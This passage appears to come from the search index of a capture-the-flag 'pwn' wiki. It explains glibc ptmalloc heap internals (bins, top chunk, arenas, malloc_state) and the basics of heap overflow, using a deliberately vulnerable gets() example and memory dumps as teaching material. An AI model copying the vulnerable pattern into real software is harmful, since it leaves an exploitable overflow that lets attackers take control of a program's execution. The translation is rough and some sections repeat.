efficiency. Because we spend most of our time in the process of merging, segmentation, and intermediate checks. Therefore, the fast bin is specifically designed in ptmalloc, and the corresponding variable is fastbinsY in malloc state. /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ In order to use the fast bin more efficiently, glibc uses a singly linked list to organize each bin, and each bin adopts the LIFO policy , and the recently released chunk will be allocated earlier, so it is more suitable for Locality. That is to say, when the size of the chunk that the user needs is smaller than the maximum size of the fastbin, ptmalloc will first determine whether there is a free block of the corresponding size in the corresponding bin in the fastbin, if any, the chunk will be directly obtained from the bin. . If not, ptmalloc will do the next series of operations. By default ( 32-bit system is an example ), the maximum chunk size supported by default in fastbin is 64 bytes. But the chunk of data that it can support is up to 80 bytes. In addition, fastbin can support up to 10 bins, starting from 8 bytes in data space up to 80 bytes (note that the size of the data space is the same, that is, the prev_size and size fields are removed. Size) is defined as follows #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ / / Determine whether the allocation area has fast bin chunk , 1 means no #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // Whether MORECORE returns a contiguous memory area. // MORECORE in the main allocation area is actually sbr(), which returns the default virtual address space by default. // The non-primary allocation area uses mmap() to allocate large blocks of virtual memory and then splits to simulate the behavior of the primary allocation area. // By default, the mmap mapping area does not guarantee that the virtual address space is continuous, so the non-primary allocation area allocates non-contiguous virtual address space by default. #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ ((( s ) == 0 ) ? SMALLBIN_WIDTH : (( s + SIZE_SZ ) & ~ MALLOC_ALIGN_MASK )) #define get_max_fast() global_max_fast By default, ptmalloc calls set_max_fast(s) to set the global variable global_max_fast to DEFAULT_MXFAST, which is the maximum value of the chunk in the fast bins. When MAX_FAST_SIZE is set to 0, the system does not support fastbin. fastbin index #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) / / Here to reduce 2 , otherwise , the first two bins have no way to index . #define fastbin_index(sz) \\ (((( unsigned int ) ( sz )) >> ( SIZE_SZ == 8 ? 4 : 3 )) - 2 ) It is important to note that the inuse of the chunk of the fastbin range is always set to 1. Therefore they will not merge with other released chunks. However, when the size of the released chunk and the free chunk adjacent to the chunk are larger than FASTBIN_CONSOLIDATION_THRESHOLD, the memory fragmentation may be more. We need to merge the chunks in the fast bins to reduce the impact of memory fragmentation on the system. /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) The malloc_consolidate function combines all the chunks in the fastbin that can be merged with other chunks. See in detail the analysis of subsequent detailed functions. /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */","title":"Fast Bin"},{"location":"pwn/linux/glibc-heap/heap_structure/#small-bin","text":"The relationship between the size of each chunk in small bins and the index of the bin it is in is: chunk_size = 2 * SIZE_SZ *index, as follows Subscript SIZE_SZ=4 (32-bit) SIZE_SZ=8 (64-bit) | 2 | 16 | 32 | | 3 | 24 | 48 | | 4 | 32 | 64 | | 5 | 40 | 80 | | x | 2*4*x | 2*8*x | | 63 | 504 | 1008 | There are a total of 62 circular doubly linked lists in small bins, and the chunks stored in each linked list are the same size. For example, for a 32-bit system, the chunk size stored in the doubly linked list corresponding to subscript 2 is 16 bytes. Each linked list has a linked list node, which makes it easy to manage the internal nodes of the linked list. In addition, the linked list for each bin in small bins uses the FIFO rule , so the chunks that are first released in the same linked list are first allocated. The small bin related macros are as follows #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // Do you need to correct the subscript of the small bin? #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) / / Determine whether the size of the chunk is within the range of small bin #define in_smallbin_range(sz) \\ (( unsigned long ) ( sz ) < ( unsigned long ) MIN_LARGE_SIZE ) // Get the index corresponding to the small bin according to the size of the chunk. #define smallbin_index(sz) \\ (( SMALLBIN_WIDTH == 16 ? ((( unsigned ) ( sz )) >> 4 ) \\ : ((( unsigned ) ( sz )) >> 3 )) + \\ SMALLBIN_CORRECTION ) Perhaps, everyone will be very confused, the size of the chunks in the fastbin and small bin will have a large part of the overlap, then the size of the bin in the small bin is not useful? In fact, the chunks in the fast bin are likely to be placed in the small bin. We will have a deep understanding when analyzing the specific source code later.","title":"Small Bin"},{"location":"pwn/linux/glibc-heap/heap_structure/#large-bin","text":"A large total of 63 bins are included in the large bins. The size of the chunks in each bin is inconsistent, but within a certain range. In addition, the 63 bins are divided into 6 groups, and the tolerances between the chunk sizes in each group bin are the same, as follows: Group Quantity Tolerance | 1 32 64B | | 2 16 512B | | 3 | 8 | 4096B | | 4 4 32768B | | 5 | 2 | 262144B | | 6 | 1 | No limit | Here we take the large bin of the 32-bit platform as an example. The size of the first chunk of the first large bin is 512 bytes, which is in the first group, so the size of the chunk that the bin can store is [512, 512 + 64). The macro about large bin is as follows. Here we take the initial chunk size of the first large bin on the 32-bit platform as 512 bytes, then 512>>6 = 8, so the subscript is 56+8= 64. #define largebin_index_32(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 38 ) \\ ? 56 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) #define largebin_index_32_big(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 45 ) \\ ? 49 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ ((((( unsigned long ) ( sz )) >> 6 ) <= 48 ) \\ ? 48 + ((( unsigned long ) ( sz )) >> 6 ) \\ : (((( unsigned long ) ( sz )) >> 9 ) <= 20 ) \\ ? 91 + ((( unsigned long ) ( sz )) >> 9 ) \\ : (((( unsigned long ) ( sz )) >> 12 ) <= 10 ) \\ ? 110 + ((( unsigned long ) ( sz )) >> 12 ) \\ : (((( unsigned long ) ( sz )) >> 15 ) <= 4 ) \\ ? 119 + ((( unsigned long ) ( sz )) >> 15 ) \\ : (((( unsigned long ) ( sz )) >> 18 ) <= 2 ) \\ ? 124 + ((( unsigned long ) ( sz )) >> 18 ) \\ : 126 ) #define largebin_index(sz) \\ ( SIZE_SZ == 8 ? largebin_index_64 ( sz ) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big ( sz ) \\ : largebin_index_32 ( sz ))","title":"Large Bin"},{"location":"pwn/linux/glibc-heap/heap_structure/#unsorted-bin","text":"Unsorted bin can be thought of as a buffer before the free chunk returns to its own bin. Its specific description in glibc is as follows /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ From the macro below we can see /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) The unsorted bin is at the subscript 1 of the bin array we mentioned earlier. Therefore, the unsorted bin has only one linked list. Idle chunks in unsorted bin are out of order, with two main sources When a larger chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin. When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below. In addition, the traversal order used by Unsorted Bin during the process is FIFO.","title":"Unsorted Bin"},{"location":"pwn/linux/glibc-heap/heap_structure/#common-macro","text":"Here are some general macros. Unified to get the index of the chunk according to the size of the chunk #define bin_index(sz) \\ (( in_smallbin_range ( sz )) ? smallbin_index ( sz ) : largebin_index ( sz ))","title":"common macro"},{"location":"pwn/linux/glibc-heap/heap_structure/#top-chunk","text":"The description of top chunk in glibc is as follows /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) When the program first performs malloc, the heap is divided into two pieces, one for the user, and the remaining one is the top chunk. In fact, the so-called top chunk is the chunk with the highest physical address in the current heap. This chunk does not belong to any bin. Its function is to allocate all the bins if they are not up to the specified size. If the size is not less than the specified size, the allocation is made and the remaining part is used as the new top chunk. Otherwise, the heap is expanded and then allocated. The heap is extended by sbrk in the main arena, and the new heap is allocated by the mmap in the thread arena. It should be noted that the prev_inuse bit of the top chunk is always 1, otherwise the previous chunk will be merged into the top chunk. In the initial case, we can use the unsorted chunk as the top chunk.","title":"Top Chunk"},{"location":"pwn/linux/glibc-heap/heap_structure/#last-remainder","text":"When a user uses malloc to request memory allocation, the chunk found by ptmalloc2 may not match the size of the requested memory. In this case, the remaining portion after the split is called the last remainder chunk, and the unsort bin will also store the chunk. The top chunk splits the rest of the section as a last remainder.","title":"last remainder"},{"location":"pwn/linux/glibc-heap/heap_structure/#macrostructure","text":"","title":"Macrostructure"},{"location":"pwn/linux/glibc-heap/heap_structure/#arena","text":"In the example we introduced earlier, whether it is the main thread or the newly created thread, there will be a separate arena when applying for memory for the first time. So will each thread have an independent arena? Below we will introduce in detail.","title":"arena"},{"location":"pwn/linux/glibc-heap/heap_structure/#arena-quantity","text":"For different systems, the [constraints] of the number of arena ( https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847 ) are as follows For 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. Obviously, not every thread will have a corresponding arena. As for why the 64-bit system is set up, I don't want to understand it. In addition, because the number of cores per system is limited, when the number of threads is more than twice the number of cores (hyperthreading technology), there must be threads waiting, so there is no need to assign an arena to each thread.","title":"arena Quantity"},{"location":"pwn/linux/glibc-heap/heap_structure/#arena-distribution-rules","text":"To be added.","title":"arena Distribution Rules"},{"location":"pwn/linux/glibc-heap/heap_structure/#the-difference","text":"Unlike thread, main_arena is not in the applied heap, but a global variable in the data segment of libc.so.","title":"the difference"},{"location":"pwn/linux/glibc-heap/heap_structure/#heap_info","text":"When the program first starts executing, each thread has no heap area. When it applies for memory, it needs a structure to record the corresponding information, and the role of heap_info is this. And when the resources of the heap are used, you must apply for memory again. In addition, the generally applied heap is not continuous, so it is necessary to record the link structure between different heaps. This data structure is specifically prepared for memory requested from the Memory Mapping Segment, which is prepared for non-primary threads. The main thread can be extended by the program break location via the sbrk() function (until it touches the Memory Mapping Segment), with only one heap and no heap_info data structure. The main structure of heap_info is as follows #define HEAP_MIN_SIZE (32 * 1024) #ifndef HEAP_MAX_SIZE # ifdef DEFAULT_MMAP_THRESHOLD_MAX # define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) # else # define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */ # endif #endif /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */ /***************************************************************************/ /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */ typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ -6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ; This structure is mainly to describe the basic information of the heap, including the address of the corresponding arena of the heap Since a thread requests a heap, it may be used up and must be applied again. Therefore, one thread may have multiple heaps. Prev records the address of the last heap_info. Here you can see that each heap's heap_info is linked through a singly linked list. size indicates the size of the current heap The last part ensures alignment ( What is the reason for the negative use here? ) It seems that the structure should be quite important, but if we look closely at the implementation of the full malloc, we will find that it does not appear frequently.","title":"heap_info"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_state","text":"This structure is used to manage the heap and record the specific state of the memory of each arena's current application, such as whether there are free chunks, what size of free chunks, and so on. Whether it is thread arena or main arena, they all have only one malloc state structure. Since there may be more than one of the thread's arena, the malloc state structure will be in the latest application's arena. Note that the main arena's malloc_state is not part of the heap segment, but a global variable stored in the libc.so data segment. Its structure is as follows struct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex ); /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ unsigned int binmap [ BINMAPSIZE ]; /* Linked list, points to the next arena */ struct malloc_state * next ; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state * next_free ; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; }; __libc_lock_define(, mutex); This variable is used to control the serial access of the program to the same allocation area. When a thread acquires the allocation area, other threads must wait for the thread allocation to complete before they can access the allocation area. flags flags records some flags of the allocation area. For example, bit0 records whether the allocation area has a fast bin chunk, and bit1 identifies whether the allocation area can return a continuous virtual address space. details as follows /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) fastbinsY[NFASTBINS] a pointer to the head of each fast chunk list top Point to the top chunk of the allocation area last_reminder The remaining part after the latest chunk split bins A chunk list for storing unstored bins, small bins and large bins. binmap ptmalloc uses a bit to identify whether a bin contains free chunks.","title":"malloc_state"},{"location":"pwn/linux/glibc-heap/heap_structure/#malloc_par","text":"! ! To be added! !","title":"malloc_par"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/","text":"Heap Overflow \u00b6 Introduction \u00b6 Heap overflow means that the number of bytes written by the program into a heap block exceeds the number of bytes that can be used by the heap itself ( is the number of bytes that can be used instead of the number of bytes requested by the user, because the heap manager The number of bytes requested by the user is adjusted, which also causes the number of available bytes to be no less than the number of bytes requested by the user ), thus causing data overflow and covering to physically adjacent high The next heap of addresses . It is not difficult to find that the basic premise of a heap overflow vulnerability is The program writes data to the heap. The size of the data written is not well controlled. For the attacker, the heap overflow vulnerability can make the program crash, and the attacker can control the execution flow of the program. A heap overflow is a specific buffer overflow (and stack overflow, bss segment overflow, etc.). However, unlike stack overflow, there is no return address on the heap that allows the attacker to directly control the execution flow, so we generally cannot control EIP directly through heap overflow. In general, our strategy for using heap overflow is Overwrite the contents of the next chunk physically adjacent to its . prev_size size, which has three main bits and the true size of the heap. - NON_MAIN_ARENA - IS_MAPPED - PREV_INUSE - the True chunk size chunk content, which changes the execution flow inherent in the program. Use the mechanism in the heap (such as unlink, etc.) to implement the arbitrary address write (Write-Anything-Anywhere) or control the contents of the heap block to control the execution flow of the program. Basic example \u00b6 Let's take a simple example: #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } The main purpose of this program is to call malloc to allocate memory on a heap, and then write a string to the heap. If the input string is too long, it will cause the area of the chunk to overflow and overwrite the top chunk. (In fact, puts internally calls malloc to allocate heap memory, which may not be covered by top chunk). 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <===top chunk 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 Write 'A'*100 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 <===top chunk (has been overflowed) 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 \u5c0f\u8ff0 \u00b6 Several important steps in heap overflow: Looking for heap allocation functions \u00b6 Usually the heap is allocated by calling the glibc function malloc, which in some cases uses the calloc assignment. The difference between calloc and malloc is that calloc is automatically emptied after allocation, which is fatal for the exploitation of certain information disclosure vulnerabilities . calloc(0x20); //Equivalent to ptr = malloc (0x20); memset(ptr,0,0x20); In addition to this, there is another type of allocation via realloc, which can function as both malloc and free. #include <stdio.h> int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0; } The operation of realloc is not as simple as it is literally, and its internal operations will be different depending on different situations. When the size of realloc(ptr,size) is not equal to the size of ptr If the application size > original size If the chunk is adjacent to the top chunk, extend the chunk directly to the new size. If the chunk is not adjacent to the top chunk, it is equivalent to free(ptr), malloc(new_size) If the application size < original size If the difference is not enough to accommodate the next smallest chunk (32 bytes under 64 bits, 16 bytes under 32 bits), it remains unchanged If the difference can accommodate the next smallest chunk, then the original chunk is cut into two parts, and the part is free. When the size of realloc(ptr,size) is equal to 0, it is equivalent to free(ptr) When the size of realloc(ptr,size) is equal to the size of ptr, no action is taken. Looking for dangerous functions \u00b6 By looking for dangerous functions, we quickly determine if the program is likely to have a heap overflow and, if so, where the heap overflows. Common dangerous functions are as follows Enter gets, read a line directly, ignoring '\\x00' scanf vscanf output sprintf string strcpy, string copy, encountered '\\x00' stop strcat, string stitching, encountered '\\x00' stop bcopy Determine the fill length \u00b6 This part is mainly to calculate the distance between the address we started writing and the address we want to cover**. A common misconception is that the malloc parameter is equal to the actual allocated heap size, but in fact the size allocated by ptmalloc is aligned. This length is typically twice the word length, such as a 32-bit system with 8 bytes and a 64-bit system with 16 bytes. However, for requests that are no longer than 2 times the word length, malloc will directly return the block of 2 times the word length, which is the smallest chunk. For example, a 64-bit system executing malloc(0) will return a block with a user area of 16 bytes. #include <stdio.h> int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0; } // According to the number of bits in the system, malloc will allocate 8 or 16 bytes of user space 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 0x602030: 0x0000000000000000 0x0000000000000000 Note that the size of the user area is not equal to chunk_hear.size, chunk_hear.size=user area size + 2* word length Another point is that the memory size of the user application mentioned above will be modified, and it is possible to store the content using the prev_size field of the next chunk that is physically adjacent to it. Go back and look at the previous sample code. #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } Looking at the above code, the chunk size we applied for is 24 bytes. But when we compile it into a 64-bit executable, the actual allocated memory will be 16 bytes instead of 24. 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 How does the 16-byte space fit the next 24 bytes of content? The answer is to borrow the pre_size field of the next block. Let's take a look at the conversion between the size of the memory requested by the user and the amount of memory actually allocated in glibc. /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) When req=24, request2size(24)=32. And remove the 16 bytes of the chunk header. In fact, the number of bytes available to the user is 16. According to what we learned earlier, we know that the chunk's pre_size only works when its previous block is released. So the user can actually use the prev_size field of the next chunk at this time, exactly 24 bytes. Actually, ptmalloc allocates memory in double words as the basic unit. Taking 64-bit system as an example, the allocated space is an integer multiple of 16, that is, the chunks applied by the user are 16-byte aligned.","title":"Heap Overflow"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#heap-overflow","text":"","title":"Heap Overflow"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#introduction","text":"Heap overflow means that the number of bytes written by the program into a heap block exceeds the number of bytes that can be used by the heap itself ( is the number of bytes that can be used instead of the number of bytes requested by the user, because the heap manager The number of bytes requested by the user is adjusted, which also causes the number of available bytes to be no less than the number of bytes requested by the user ), thus causing data overflow and covering to physically adjacent high The next heap of addresses . It is not difficult to find that the basic premise of a heap overflow vulnerability is The program writes data to the heap. The size of the data written is not well controlled. For the attacker, the heap overflow vulnerability can make the program crash, and the attacker can control the execution flow of the program. A heap overflow is a specific buffer overflow (and stack overflow, bss segment overflow, etc.). However, unlike stack overflow, there is no return address on the heap that allows the attacker to directly control the execution flow, so we generally cannot control EIP directly through heap overflow. In general, our strategy for using heap overflow is Overwrite the contents of the next chunk physically adjacent to its . prev_size size, which has three main bits and the true size of the heap. - NON_MAIN_ARENA - IS_MAPPED - PREV_INUSE - the True chunk size chunk content, which changes the execution flow inherent in the program. Use the mechanism in the heap (such as unlink, etc.) to implement the arbitrary address write (Write-Anything-Anywhere) or control the contents of the heap block to control the execution flow of the program.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#basic-example","text":"Let's take a simple example: #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } The main purpose of this program is to call malloc to allocate memory on a heap, and then write a string to the heap. If the input string is too long, it will cause the area of the chunk to overflow and overwrite the top chunk. (In fact, puts internally calls malloc to allocate heap memory, which may not be covered by top chunk). 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <===top chunk 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 Write 'A'*100 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 <===top chunk (has been overflowed) 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141","title":"Basic example"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#_1","text":"Several important steps in heap overflow:","title":"\u5c0f\u8ff0"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#looking-for-heap-allocation-functions","text":"Usually the heap is allocated by calling the glibc function malloc, which in some cases uses the calloc assignment. The difference between calloc and malloc is that calloc is automatically emptied after allocation, which is fatal for the exploitation of certain information disclosure vulnerabilities . calloc(0x20); //Equivalent to ptr = malloc (0x20); memset(ptr,0,0x20); In addition to this, there is another type of allocation via realloc, which can function as both malloc and free. #include <stdio.h> int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0; } The operation of realloc is not as simple as it is literally, and its internal operations will be different depending on different situations. When the size of realloc(ptr,size) is not equal to the size of ptr If the application size > original size If the chunk is adjacent to the top chunk, extend the chunk directly to the new size. If the chunk is not adjacent to the top chunk, it is equivalent to free(ptr), malloc(new_size) If the application size < original size If the difference is not enough to accommodate the next smallest chunk (32 bytes under 64 bits, 16 bytes under 32 bits), it remains unchanged If the difference can accommodate the next smallest chunk, then the original chunk is cut into two parts, and the part is free. When the size of realloc(ptr,size) is equal to 0, it is equivalent to free(ptr) When the size of realloc(ptr,size) is equal to the size of ptr, no action is taken.","title":"Looking for heap allocation functions"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#looking-for-dangerous-functions","text":"By looking for dangerous functions, we quickly determine if the program is likely to have a heap overflow and, if so, where the heap overflows. Common dangerous functions are as follows Enter gets, read a line directly, ignoring '\\x00' scanf vscanf output sprintf string strcpy, string copy, encountered '\\x00' stop strcat, string stitching, encountered '\\x00' stop bcopy","title":"Looking for dangerous functions"},{"location":"pwn/linux/glibc-heap/heapoverflow_basic/#determine-the-fill-length","text":"This part is mainly to calculate the distance between the address we started writing and the address we want to cover**. A common misconception is that the malloc parameter is equal to the actual allocated heap size, but in fact the size allocated by ptmalloc is aligned. This length is typically twice the word length, such as a 32-bit system with 8 bytes and a 64-bit system with 16 bytes. However, for requests that are no longer than 2 times the word length, 